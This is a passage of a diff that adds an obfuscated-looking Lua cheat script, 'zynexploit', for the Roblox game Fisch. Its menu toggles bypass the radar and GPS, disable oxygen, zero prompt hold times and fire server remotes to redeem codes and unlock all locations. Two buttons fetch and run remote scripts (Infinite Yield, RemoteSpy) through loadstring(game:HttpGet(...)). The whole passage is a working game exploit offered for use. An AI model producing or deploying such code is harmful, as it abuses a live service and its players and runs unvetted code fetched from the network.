+                    vu45:Disconnect()
+                    vu45 = nil
+                end
+                if vu46 then
+                    vu46:Disconnect()
+                    vu46 = nil
+                end
+                if vu96:FindFirstChild("Velocity") then
+                    vu96.Velocity:Destroy()
+                end
+                if vu96:FindFirstChild("Gyro") then
+                    vu96.Gyro:Destroy()
+                end
+            end
+        end
+    })
+    v137:Section({
+        Title = "Miscellaneous Features"
+    })
+    v137:Toggle({
+        Title = "Bypass Fish Radar",
+        Value = false,
+        Callback = function(p228)
+            local v229, v230, v231 = pairs(game:GetService("CollectionService"):GetTagged("radarTag"))
+            while true do
+                local v232
+                v231, v232 = v229(v230, v231)
+                if v231 == nil then
+                    break
+                end
+                if v232:IsA("BillboardGui") or v232:IsA("SurfaceGui") then
+                    v232.Enabled = p228
+                end
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Bypass GPS",
+        Value = false,
+        Callback = function(pu233)
+            if pu233 then
+                local vu234 = vu3.resources.items.items.GPS.GPS.gpsMain.xyz:Clone()
+                vu234.Parent = vu92:WaitForChild("hud"):WaitForChild("safezone"):WaitForChild("backpack")
+                local function v236()
+                    local v235 = vu96.Position
+                    vu234.Text = string.format("<font color=\'#ff4949\'>X</font><font color=\'#a3ff81\'>Y</font><font color=\'#626aff\'>Z</font>: %.1f, %.1f, %.1f", v235.X, v235.Y, v235.Z)
+                end
+                v236()
+                local vu237 = vu8.Heartbeat:Connect(v236)
+                task.spawn(function()
+                    while pu233 do
+                        task.wait()
+                    end
+                    vu237:Disconnect()
+                    vu234:Destroy()
+                end)
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Remove Fog",
+        Value = false,
+        Callback = function(p238)
+            if p238 then
+                if game:GetService("Lighting"):FindFirstChild("Sky") then
+                    game:GetService("Lighting").Sky.Parent = game:GetService("Lighting").bloom
+                end
+            elseif game:GetService("Lighting").bloom:FindFirstChild("Sky") then
+                game:GetService("Lighting").bloom.Sky.Parent = game:GetService("Lighting")
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Day Only",
+        Value = false,
+        Callback = function(pu239)
+            if pu239 then
+                local vu240 = vu8.Heartbeat:Connect(function()
+                    game:GetService("Lighting").TimeOfDay = "12:00:00"
+                end)
+                task.spawn(function()
+                    while pu239 do
+                        task.wait()
+                    end
+                    vu240:Disconnect()
+                end)
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Hold Duration 0 sec",
+        Value = false,
+        Callback = function(p241)
+            if p241 then
+                local v242 = vu9
+                local v243, v244, v245 = ipairs(v242:GetDescendants())
+                while true do
+                    local v246
+                    v245, v246 = v243(v244, v245)
+                    if v245 == nil then
+                        break
+                    end
+                    if v246.ClassName == "ProximityPrompt" then
+                        v246.HoldDuration = 0
+                    end
+                end
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Disable Oxygen",
+        Value = false,
+        Callback = function(p247)
+            if vu13.Character and vu13.Character:FindFirstChild("client") then
+                vu13.Character.client.oxygen.Disabled = p247
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Show/Hide UIs",
+        Value = true,
+        Callback = function(p248)
+            if vu92.hud and vu92.hud.safezone then
+                vu92.hud.safezone.Visible = p248
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "Protect Identity",
+        Value = false,
+        Callback = function(pu249)
+            if pu249 then
+                task.spawn(function()
+                    while pu249 do
+                        local v250 = vu96:FindFirstChild("user")
+                        if v250 then
+                            if v250:FindFirstChild("streak") then
+                                v250.streak.Text = "HIDDEN"
+                            end
+                            if v250:FindFirstChild("level") then
+                                v250.level.Text = "Level: HIDDEN"
+                            end
+                            if v250:FindFirstChild("user") then
+                                v250.user.Text = "HIDDEN"
+                            end
+                        end
+                        local v251 = vu92:WaitForChild("hud"):WaitForChild("safezone")
+                        if v251:FindFirstChild("coins") then
+                            v251.coins.Text = "HIDDEN$"
+                        end
+                        if v251:FindFirstChild("lvl") then
+                            v251.lvl.Text = "HIDDEN LVL"
+                        end
+                        task.wait(0.01)
+                    end
+                end)
+            end
+        end
+    })
+    v137:Toggle({
+        Title = "White Screen",
+        Value = false,
+        Callback = function(p252)
+            vu8:Set3dRenderingEnabled(not p252)
+        end
+    })
+    v137:Toggle({
+        Title = "Instant Interact NPC",
+        Value = false,
+        Callback = function(p253)
+            if p253 and fireproximityprompt then
+                vu47 = vu12.PromptButtonHoldBegan:Connect(function(p254)
+                    fireproximityprompt(p254)
+                end)
+            elseif vu47 then
+                vu47:Disconnect()
+                vu47 = nil
+            end
+        end
+    })
+    v137:Button({
+        Title = "Instant Die",
+        Callback = function()
+            vu3:WaitForChild("events"):WaitForChild("drown"):FireServer(0)
+        end
+    })
+    v137:Button({
+        Title = "Redeem All Codes",
+        Callback = function()
+            local v255, v256, v257 = ipairs({
+                "THEKRAKEN",
+                "RFG",
+                "CARBON",
+                "SORRYGUYS",
+                "ATLANTEANSTORM",
+                "GOLDENTIDE",
+                "GOODBYEFISCHMAS",
+                "NewYear",
+                "1BVisits",
+                "RRG",
+                "NorthernExpedition"
+            })
+            while true do
+                local v258
+                v257, v258 = v255(v256, v257)
+                if v257 == nil then
+                    break
+                end
+                vu3:WaitForChild("events"):WaitForChild("runcode"):FireServer(v258)
+            end
+        end
+    })
+    v137:Button({
+        Title = "Discover All Locations",
+        Callback = function()
+            local v259 = vu3:WaitForChild("events"):WaitForChild("discoverlocation")
+            local v260, v261, v262 = pairs({
+                "The Depths",
+                "Roslit",
+                "Ancient Isle",
+                "Sunstone",
+                "Volcanic Vents",
+                "Winter\'s Edge",
+                "Frigid Cavern",
+                "Atlantean Storm",
+                "Abyssal Zenith",
+                "Terrapin",
+                "Ancient Archives",
+                "Snowcap",
+                "Glacial Grotto",
+                "All",
+                "Ashfall",
+                "Overgrowth Caves",
+                "Roslit Volcano",
+                "Veil of the Forsaken",
+                "Calm Zone",
+                "Moosewood",
+                "Vertigo",
+                "FischFright",
+                "Challenger\'s Deep",
+                "Keepers Altar",
+                "Ocean",
+                "Archeological Site",
+                "Cryogenic Canal",
+                "Forsaken Shores",
+                "Fischgiving",
+                "Grand Reef",
+                "Brine Pool",
+                "Fischmas",
+                "Desolate Deep",
+                "Mushgrove",
+                "Golden Tide",
+                "Atlantis"
+            })
+            while true do
+                local v263
+                v262, v263 = v260(v261, v262)
+                if v262 == nil then
+                    break
+                end
+                v259:FireServer(v263)
+            end
+        end
+    })
+    v137:Button({
+        Title = "Load Infinite-Yield FE",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+        end
+    })
+    v137:Button({
+        Title = "Load RemoteSpy",
+        Callback = function()
+            loadstring(game:HttpGetAsync("https://github.com/richie0866/remote-spy/releases/latest/download/RemoteSpy.lua"))()
+        end
+    })
+    v138:Section({
+        Title = "Server Settings"
+    })
+    v138:Textbox({
+        Title = "Job ID",
+        Placeholder = "Enter Job ID",
+        Value = "",
+        Callback = function(p264)
+            _G.JobID = p264
+        end
+    })
+    v138:Button({
+        Title = "Join Job ID",
+        Callback = function()
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, _G.JobID, vu13)
+        end
+    })
+    v138:Button({
+        Title = "Copy Job ID",
+        Callback = function()
+            setclipboard(game.JobId)
+            vu51("Job ID Copied", "Copied: " .. game.JobId)
+        end
+    })
+    v138:Button({
+        Title = "Low-Server Hop",
+        Callback = v129
+    })
+    v138:Button({
+        Title = "Rejoin Server",
+        Callback = function()
+            game:GetService("TeleportService"):Teleport(game.PlaceId, vu13)
+        end
+    })
+    v138:Toggle({
+        Title = "Auto-Rejoin",
+        Value = false,
+        Callback = function(pu265)
+            if pu265 then
+                local vu267 = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(p266)
+                    if p266.Name == "ErrorPrompt" and p266:FindFirstChild("MessageArea") and p266.MessageArea:FindFirstChild("ErrorFrame") then
+                        game:GetService("TeleportService"):Teleport(game.PlaceId)
+                    end
+                end)
+                task.spawn(function()
+                    while pu265 do
+                        task.wait()
+                    end
+                    vu267:Disconnect()
+                end)
+            end
+        end
+    })
+    vu92.DescendantAdded:Connect(function(p268)
+        if vu95 and (p268.Name == "button" and (p268.Parent and p268.Parent.Name == "safezone")) then
+            vu69()
+        elseif vu93 and (p268.Name == "playerbar" and (p268.Parent and p268.Parent.Name == "bar")) then
+            vu76()
+        end
+    end)
+    vu92.DescendantRemoving:Connect(function(p269)
+        if p269.Name == "playerbar" and (p269.Parent and p269.Parent.Name == "bar") then
+            vu77()
+            if vu91 then
+                task.wait(1)
+                task.spawn(vu61)
+            end
+        end
+    end)
+    vu1:Notify({
+        Title = "zynexploit",
+        Desc = "All features loaded successfully! Credits: zynganteng",
+        Time = 4
+    })
+end
